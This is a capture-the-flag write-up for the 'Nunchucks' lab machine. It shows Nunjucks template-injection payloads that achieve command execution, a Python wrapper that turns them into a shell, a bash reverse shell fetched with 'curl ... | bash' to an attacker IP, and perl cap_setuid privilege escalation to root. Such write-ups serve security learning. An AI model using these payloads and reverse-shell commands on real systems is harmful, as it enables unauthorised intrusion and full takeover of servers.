# Nunchucks

Date Completed: 13th November 2022

Getting Ready
```console
$ export IP=10.10.11.122
```
Added `nunchucks.htb` to `/etc/hosts`.

Initial Recon
```console
$ nmap -A -T5 $IP -vv -oN nmap/initial

[REDACTED]
22/tcp  open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     syn-ack nginx 1.18.0 (Ubuntu)
443/tcp open  ssl/http syn-ack nginx 1.18.0 (Ubuntu)
```

Full Port Scan
```
$ sudo nmap -sS -n -p- T5 $IP -vv -oN nmap/full

[REDACTED]
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```
No other ports open.

Website:
	/login
	/signup
	(Both leads to 'currently disabled')

Fuzzing on subdomains:
```console
$ wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -c -t 20 -H "Host: FUZZ.nunchucks.htb" --hw 2271 https://nunchucks.htb

[REDACTED]
=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000081:   200        101 L    259 W      4028 Ch     "store"
[REDACTED]
```

There's a subdomain called `store`. Let's add `store.nunchucks.htb` to `/etc/hosts`.

Let's visit `https://store.nunchucks.htb`.

There a function where we can subscribe to the mail service. Our input gets submitted to `/api/submit` with a **POST** request.

In Burpsuite, the following is the response when I submit the value `123@mail.com`:
```json
{"response":"You will receive updates on the following email address: 123@mail.com."}
```

It reflects our input, so I played around with this entry point by supplying different kinds of injection methods. Eventually, I triggered an error when I try to inject with **SSTI**.

Here is the payload that triggered the error, referenced from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#detection). I've added a `\` to escape the `"` character in the json request.
```
{"email":"${{<%[%'\"}}%\."}
                   ^
                  Here
```

Response:
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected token . in JSON at position 24<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at parse (/var/www/store.nunchucks/node_modules/body-parser/lib/types/json.js:89:19)<br> &nbsp; &nbsp;at /var/www/store.nunchucks/node_modules/body-parser/lib/read.js:121:18<br> &nbsp; &nbsp;at invokeCallback (/var/www/store.nunchucks/node_modules/raw-body/index.js:224:16)<br> &nbsp; &nbsp;at done (/var/www/store.nunchucks/node_modules/raw-body/index.js:213:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/var/www/store.nunchucks/node_modules/raw-body/index.js:273:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:203:15)<br> &nbsp; &nbsp;at endReadableNT (_stream_readable.js:1145:12)<br> &nbsp; &nbsp;at process._tickCallback (internal/process/next_tick.js:63:19)</pre>
</body>
</html>

```

From the error message, we can easily see the word `node_modules`, which I assume the server is running in **NodeJS**.

Then I searched for payloads for **NodeJS**. Eventually, the following payload worked, referenced from [here](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks).
```json
{"email":"{{7*7}}"}
```

Response:
```json
{"response":"You will receive updates on the following email address: 49."}
```

### This server runs on **NUNJUCKS** (NodeJS)

I proceed to read `/etc/passwd` with the following payload:
```json
{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /etc/passwd')\")()}}"}
```

Response:
```json
{"response":"You will receive updates on the following email address: root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\ndavid:x:1000:1000:david:/home/david:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nrtkit:x:113:117:RealtimeKit,,,:/proc:/usr/sbin/nologin\ndnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\ngeoclue:x:115:120::/var/lib/geoclue:/usr/sbin/nologin\navahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\ncups-pk-helper:x:117:123:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin\nsaned:x:118:124::/var/lib/saned:/usr/sbin/nologin\ncolord:x:119:125:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\npulse:x:120:126:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\nmysql:x:121:128:MySQL Server,,,:/nonexistent:/bin/false\n."}
```

It is very messy, so I've written a simple python script to make it easier to read, `read.py`:
```python
#!/usr/bin/env python3

import requests
import json
import warnings
warnings.filterwarnings("ignore")

url = "https://store.nunchucks.htb/api/submit"

while True:
	cmd = input("$ ")
	data = {"email": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('" + cmd + "')\")()}}"}
	response = requests.post(url, data=data, verify=False)
	output = response.json()["response"].split("You will receive updates on the following email address: ")[1][:-1]
	print(output)
```

```console
$ ./read.py
$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
david:x:1000:1000:david:/home/david:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
rtkit:x:113:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
geoclue:x:115:120::/var/lib/geoclue:/usr/sbin/nologin
avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:117:123:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
saned:x:118:124::/var/lib/saned:/usr/sbin/nologin
colord:x:119:125:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:120:126:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
mysql:x:121:128:MySQL Server,,,:/nonexistent:/bin/false
```

Now it looks more neat.

Then I checked whether the box has `curl`. Cuz normally a revere shell command includes some bad characters, so `curl` would be the best way to retrieve each letter of the reverse shell without flaws.

```console
$ ./read.py

$ which curl
/usr/bin/curl

$ which bash
/usr/bin/bash
```
 
So there's `curl` and `bash` on the box.

First, create a file called `shell.sh`, the reverse shell command is referenced from [here](https://www.revshells.com/).
```sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.2/9999 0>&1
```

Second, host a web server where the `shell.sh` file is at. For me, I will be using the `SimpleHTTPServer` module from **Python 2**.
```console
$ python2 -m SimpleHTTPServer 80

Serving HTTP on 0.0.0.0 port 80 ...
```

Third, setup a listener. I will be using netcat.
```console
$ nc -lnvp 9999

listening on [any] 9999 ...
```

Lastly, execute the following command using the SSTI vulnerability.
```console
$ ./read.py

$ curl http://10.10.14.2/shell.sh | bash
```

In my python2 web server...
```console
$ python2 -m SimpleHTTPServer 80      

Serving HTTP on 0.0.0.0 port 80 ...
10.10.11.122 - - [13/Nov/2022 04:42:01] "GET /shell.sh HTTP/1.1" 200 -
```

We got a connection, great! Next, let's check for the netcat listener...
```console
$ nc -lnvp 9999

listening on [any] 9999 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.122] 43426
bash: cannot set terminal process group (1024): Inappropriate ioctl for device
bash: no job control in this shell
david@nunchucks:/var/www/store.nunchucks$ 
```

### We are now in as `david@nunchucks`!

The **user flag** is at `/home/david/user.txt`.

Since **SSH** is running on the box, I'll stabilize my shell by [generating SSH keys](../Tips%26Tricks/Generating%20SSH%20Keys.md). (You can skip this part)
```console
[REDACTED]

Last login: Fri Oct 22 19:09:52 2021 from 10.10.14.6
david@nunchucks:~$
```

After **linpeas**, it showed me the following privilege escalation vector:
```console
/usr/bin/perl = cap_setuid+ep
```

It means that the binary `/usr/bin/perl` is able to manipulate its own process UID. We can abuse this by executing a perl script that changes the process uid to 0, then opening a root shell. Referenced from [here](https://gtfobins.github.io/gtfobins/perl/#capabilities).

```console
david@nunchucks:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

david@nunchucks:~$
```

Somehow it did not open up a root shell. But the command is being executed by root. I verified it using:
```console
david@nunchucks:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'

root
```

So I tried to read the contents of the **root flag** directly without achieving root shell.
```console
david@nunchucks:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "cat /root/root.txt";'

cat: /root/root.txt: Permission denied
```

That's werid...

Let's write a `perl` script, specifying the full path of the binary `/usr/bin/perl` that we are using to get the root shell.
```console
david@nunchucks:~$ vim root.pl
```
In `root.pl`:
```perl
#!/usr/bin/perl

use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/bash";
```

Then execute the script after adding the `execute` permissions to it.
```console
david@nunchucks:~$ chmod +x root.pl
david@nunchucks:~$ ./root.pl 
root@nunchucks:~# whoami
root
```

### Got root shell!

We can now proceed to read **root flag**.

The **root flag** is at `/root/root.txt`.

### Done
